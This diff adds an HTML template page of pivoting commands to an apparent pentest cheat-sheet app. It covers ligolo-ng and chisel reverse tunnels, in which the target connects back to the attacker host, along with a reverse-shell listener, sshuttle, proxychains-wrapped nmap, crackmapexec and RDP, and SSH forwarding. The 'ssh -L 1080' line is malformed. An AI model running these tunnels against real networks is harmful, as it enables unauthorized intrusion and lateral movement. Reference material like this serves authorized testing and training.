@@ -1,0 +1,59 @@
+{% extends "base.html" %}
+{% block content %}
+<section class="pane">
+  <div class="pane-head">
+    <h2>Pivoting</h2>
+    <p>Tunnel and forwarding templates, filled from your variables. Set <code style="font-family:var(--mono);color:var(--red)">$LHOST</code> / <code style="font-family:var(--mono);color:var(--red)">$RHOST</code> on the home tab.</p>
+  </div>
+
+  <div class="card">
+    <h3>ligolo-ng</h3>
+    <p class="hint">Reverse TUN tunnel — clean access to whole subnets. Repo: github.com/nicocha30/ligolo-ng</p>
+    <div class="cmd" data-tpl="sudo ip tuntap add user root mode tun ligolo"></div>
+    <div class="cmd" data-tpl="sudo ip link set ligolo up"></div>
+    <div class="cmd" data-tpl="sudo ./proxy -selfcert"></div>
+    <div class="cmd" data-tpl="./agent -connect {% raw %}{{LHOST}}{% endraw %}:11601 -ignore-cert &"><span class="lbl">on target</span></div>
+    <div class="cmd" data-tpl="session"></div>
+    <div class="cmd" data-tpl="start"></div>
+    <div class="cmd" data-tpl="sudo ip route add 172.16.1.0/24 dev ligolo"><span class="lbl">add route</span></div>
+    <div class="cmd" data-tpl="listener_add --addr 0.0.0.0:3000 --to 127.0.0.1:3001"><span class="lbl">set up listeners for revshells</span></div>
+  </div>
+
+  <div class="card">
+    <h3>chisel</h3>
+    <p class="hint">Reverse SOCKS proxy. Repo: github.com/jpillora/chisel</p>
+    <div class="cmd" data-tpl="chisel server -p 8000 --reverse"><span class="lbl">attacker</span></div>
+    <div class="cmd" data-tpl="chisel client $LHOST:8000 R:1080:socks"><span class="lbl">target — reverse SOCKS on your :1080</span></div>
+    <div class="cmd" data-tpl="chisel client $LHOST:8000 R:8080:$RHOST:80"><span class="lbl">target — reverse single-port forward</span></div>
+  </div>
+
+  <div class="card">
+    <h3>sshuttle</h3>
+    <p class="hint">"Poor man's VPN" over SSH — no proxychains needed, routes a subnet transparently.</p>
+    <div class="cmd" data-tpl="sshuttle -r $USER@$RHOST 10.10.20.0/24"><span class="lbl">route a subnet through the target</span></div>
+    <div class="cmd" data-tpl="sshuttle -r $USER@$RHOST 0.0.0.0/0 -x $RHOST"><span class="lbl">route everything (except the box itself)</span></div>
+    <div class="cmd" data-tpl="sshuttle -r $USER@$RHOST --dns 10.10.20.0/24"><span class="lbl">also tunnel DNS</span></div>
+    <div class="cmd" data-tpl="sshuttle -r $USER@$RHOST 10.10.20.0/24 --ssh-cmd 'ssh -i key.pem'"><span class="lbl">with a key file</span></div>
+  </div>
+
+  <div class="card">
+    <h3>proxychains</h3>
+    <p class="hint">Send any tool through a SOCKS proxy (from chisel/ligolo/ssh -D). Edit /etc/proxychains4.conf.</p>
+    <div class="cmd plain" data-tpl="[ProxyList]"><span class="lbl">/etc/proxychains4.conf — bottom section</span></div>
+    <div class="cmd plain" data-tpl="socks5 127.0.0.1 1080"><span class="lbl">add your proxy line (socks5, chisel/ssh -D)</span></div>
+    <div class="cmd" data-tpl="proxychains -q nmap -sT -Pn -p- 10.10.20.5"><span class="lbl">nmap must be -sT -Pn through a proxy</span></div>
+    <div class="cmd" data-tpl="proxychains -q crackmapexec smb 10.10.20.0/24"><span class="lbl">tooling through the tunnel</span></div>
+    <div class="cmd" data-tpl="proxychains -q xfreerdp /v:10.10.20.5 /u:$USER /p:'$PASS'"><span class="lbl">RDP through the tunnel</span></div>
+    <div class="cmd plain" data-tpl="dynamic_chain"><span class="lbl">tip: set 'dynamic_chain' (not strict) near the top of the conf</span></div>
+  </div>
+
+  <div class="card">
+    <h3>ssh forwarding</h3>
+    <p class="hint">When you already have SSH.</p>
+    <div class="cmd" data-tpl="ssh -L 8080:$RHOST:80 $USER@$RHOST"><span class="lbl">local port forward</span></div>
+    <div class="cmd" data-tpl="ssh -R 8080:127.0.0.1:80 $USER@$LHOST"><span class="lbl">remote port forward (target -> you)</span></div>
+    <div class="cmd" data-tpl="ssh -D 1080 $USER@$RHOST"><span class="lbl">dynamic SOCKS proxy (feed proxychains)</span></div>
+    <div class="cmd" data-tpl="ssh -L 1080 -N -f $USER@$RHOST"><span class="lbl">background tunnel, no shell</span></div>
+  </div>
+</section>
+{% endblock %}
